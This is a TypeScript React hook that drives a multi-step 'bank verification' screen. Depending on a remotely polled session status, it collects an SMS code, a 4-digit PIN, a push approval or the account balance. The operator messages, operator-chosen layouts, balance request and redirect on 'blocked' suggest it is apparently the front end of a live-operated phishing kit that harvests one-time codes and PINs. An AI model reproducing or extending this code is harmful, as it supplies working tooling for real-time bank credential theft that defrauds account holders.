import { useState, useEffect, useCallback } from "react";
import { useSessionStatus } from "./use-session-status";
import { useResendCountdown } from "./use-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
import type { BankVerificationProps } from "../types";

const RESEND_COOLDOWN = 60;

function normalizeLayout(slug: string | undefined): string {
  if (!slug) return "sms";
  if (slug.endsWith("-sms")) return "sms";
  if (slug.endsWith("-pin")) return "pin";
  if (slug.endsWith("-push")) return "push";
  if (slug.endsWith("-balance")) return "balance";
  return slug;
}

export interface UseBankVerificationReturn {
  missingParams: boolean;
  shouldRenderNull: boolean;
  inProgress: boolean;
  awaitingVerification: boolean;
  baseLayout: string;
  layoutProps: Record<string, unknown>;
  error: string | null;
}

export function useBankVerification({
  apiBase,
  channelSlug,
  sessionId,
  onSuccess,
  onDeclined,
  onError,
  onRedirect,
}: BankVerificationProps): UseBankVerificationReturn {
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [code, setCode] = useState("");
  const [pinValue, setPinValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    redirectUrl,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdownResetTrigger,
  } = useSessionStatus(apiBase, channelSlug, sessionId);

  const baseLayout = normalizeLayout(verificationLayout);
  const resendFn = useCallback(() => {
    if (baseLayout === "pin") return resendOtp(apiBase, channelSlug, sessionId, "pin");
    if (baseLayout === "sms") return resendOtp(apiBase, channelSlug, sessionId, "sms");
    return Promise.resolve();
  }, [apiBase, channelSlug, sessionId, baseLayout]);

  const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setCode("");
      setPinValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    if (status === "blocked" && redirectUrl) {
      if (onRedirect) {
        onRedirect(redirectUrl);
      } else {
        window.location.replace(redirectUrl);
      }
      return;
    }
    const terminalSuccess = ["success"].includes(status);
    const terminalDeclined = ["declined", "expired", "blocked"].includes(status);
    if (terminalSuccess) {
      onSuccess?.(sessionId);
      return;
    }
    if (status === "invalid") {
      onError?.("invalid");
      return;
    }
    if (terminalDeclined) {
      onDeclined?.(sessionId, status);
    }
  }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect]);

  const handleSubmitOtp = useCallback(
    async (codeValue: string) => {
      clearCodeFeedback?.();
      setSubmitting(true);
      try {
        await submitOtp(apiBase, channelSlug, sessionId, codeValue);
      } catch (e) {
        setError(e instanceof Error ? e.message : "Invalid code");
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId, clearCodeFeedback]
  );

  const handleSubmitBalance = useCallback(
    async (balanceValue: string) => {
      setError("");
      setSubmitting(true);
      try {
        await submitBalance(apiBase, channelSlug, sessionId, balanceValue);
      } catch (e) {
        setError(e instanceof Error ? e.message : "Failed to submit balance");
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId]
  );

  const missingParams = !channelSlug || !sessionId;
  const terminalSuccess = ["success"].includes(status);
  const terminalDeclined = ["declined", "expired", "blocked", "invalid"].includes(status);
  const shouldRenderNull = Boolean(redirectUrl || terminalSuccess || terminalDeclined);
  const inProgress = ["pending", "awaiting_action"].includes(status);
  const awaitingVerification = [
    "awaiting_sms",
    "awaiting_pin",
    "awaiting_push",
    "awaiting_balance",
  ].includes(status);

  const layoutProps: Record<string, unknown> =
    baseLayout === "push"
      ? { bank, transactionDetails }
      : baseLayout === "balance"
        ? {
            bank,
            transactionDetails,
            balance,
            onBalanceChange: setBalance,
            operatorMessage,
            onSubmit: () => handleSubmitBalance(balance),
            submitting,
            canSubmit: balance.trim().length > 0,
          }
        : baseLayout === "pin"
          ? {
              bank,
              transactionDetails,
              pinValue,
              onPinChange: setPinValue,
              pinMasked,
              onPinMaskToggle: () => setPinMasked((m) => !m),
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              onSubmit: () => handleSubmitOtp(pinValue),
              submitting,
              canSubmit: pinValue.replace(/\D/g, "").length === 4,
              resendState,
            }
          : {
              bank,
              transactionDetails,
              code,
              onCodeChange: setCode,
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              onSubmit: () => handleSubmitOtp(code),
              submitting,
              canSubmit: code.replace(/\D/g, "").length >= 6,
              resendState,
            };

  return {
    missingParams,
    shouldRenderNull,
    inProgress,
    awaitingVerification,
    baseLayout,
    layoutProps,
    error,
  };
}
